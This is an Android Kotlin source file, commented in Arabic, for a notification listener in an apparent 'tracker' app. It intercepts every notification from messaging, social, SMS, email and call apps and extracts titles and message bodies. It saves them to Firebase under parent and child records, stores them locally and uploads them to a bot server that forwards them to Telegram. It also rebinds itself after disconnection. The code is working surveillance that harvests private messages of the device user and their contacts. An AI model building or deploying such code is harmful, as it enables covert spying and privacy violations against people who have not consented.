package com.abuzahra.tracker.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.abuzahra.tracker.BotServerClient
import com.abuzahra.tracker.LocalStorageManager
import com.abuzahra.tracker.SharedPrefsManager
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * MyNotificationListener - مستمع الإشعارات
 * يعترض جميع الإشعارات الواردة ويقوم بـ:
 *
 * 1. تحليل الإشعار (عنوان، محتوى، تطبيق المصدر)
 * 2. حفظه في Firebase
 * 3. حفظه محلياً كملف JSON في التخزين الداخلي
 * 4. رفعه إلى سيرفر البوت الذي سيحوله لتيليجرام
 */
class MyNotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "NotificationListener"
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        val extras = sbn.notification?.extras ?: return
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""

        // تجاهل إشعارات هذا التطبيق نفسه
        if (pkg == packageName) return

        // تجاهل الإشعارات الفارغة
        if (title.isEmpty() && text.isEmpty()) return

        val parentId = SharedPrefsManager.getParentUid(this)
        val deviceId = SharedPrefsManager.getDeviceId(this)

        if (parentId == null || deviceId == null) return

        // تحديد نوع الإشعار والتطبيق المصدر
        val (type, appName) = classifyNotification(pkg)

        // بناء بيانات الإشعار
        val notificationData = mapOf(
            "type" to type,
            "app" to appName,
            "package" to pkg,
            "title" to title,
            "body" to text,
            "timestamp" to System.currentTimeMillis(),
            "collected_at" to System.currentTimeMillis()
        )

        // === 1. حفظ في Firebase ===
        try {
            val collection = if (type == "notification") "notifications" else "social_logs"
            FirebaseFirestore.getInstance()
                .collection("parents").document(parentId)
                .collection("children").document(deviceId)
                .collection(collection)
                .add(notificationData)
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حفظ الإشعار في Firebase: ${e.message}")
        }

        // === 2. حفظ محلياً (نوع عام + نوع التطبيق) ===
        LocalStorageManager.storeData(this, "notification", notificationData)
        // حفظ نسخة خاصة بالتطبيق (لتسهيل الاستعلام لاحقاً)
        if (appName != "notification") {
            LocalStorageManager.storeData(this, appName, notificationData)
        }

        // === 3. رفع إلى سيرفر البوت ===
        CoroutineScope(Dispatchers.IO).launch {
            try {
                BotServerClient.uploadData(deviceId, "notification", notificationData)
                Log.d(TAG, "تم رفع إشعار [$appName]: $title")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في رفع الإشعار: ${e.message}")
            }
        }
    }

    /**
     * تصنيف الإشعار حسب التطبيق المصدر
     * @return زوج من (النوع، اسم التطبيق)
     */
    private fun classifyNotification(pkg: String): Pair<String, String> {
        return when {
            pkg.contains("whatsapp", ignoreCase = true) -> Pair("social", "whatsapp")
            pkg.contains("telegram", ignoreCase = true) -> Pair("social", "telegram")
            pkg.contains("messenger", ignoreCase = true) || pkg.contains("facebook", ignoreCase = true)
                -> Pair("social", "messenger")
            pkg.contains("instagram", ignoreCase = true) -> Pair("social", "instagram")
            pkg.contains("snapchat", ignoreCase = true) -> Pair("social", "snapchat")
            pkg.contains("tiktok", ignoreCase = true) -> Pair("social", "tiktok")
            pkg.contains("twitter", ignoreCase = true) || pkg.contains("x.", ignoreCase = true)
                -> Pair("social", "twitter")
            pkg.contains("youtube", ignoreCase = true) -> Pair("social", "youtube")
            pkg.contains("gmail", ignoreCase = true) || pkg.contains("mail", ignoreCase = true)
                -> Pair("email", "email")
            pkg.contains("sms", ignoreCase = true) || pkg.contains("messaging", ignoreCase = true)
                -> Pair("sms", "sms")
            pkg.contains("call", ignoreCase = true) || pkg.contains("dialer", ignoreCase = true)
                -> Pair("call", "call")
            else -> Pair("notification", "notification")
        }
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "تم ربط مستمع الإشعارات")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.w(TAG, "تم فصل مستمع الإشعارات - محاولة إعادة الربط...")
        // محاولة إعادة الربط التلقائي (متاح من أندرويد 8)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            try {
                requestRebind(android.content.ComponentName(this, this.javaClass))
            } catch (e: Exception) {
                Log.e(TAG, "فشل إعادة الربط: ${e.message}")
            }
        }
    }
}
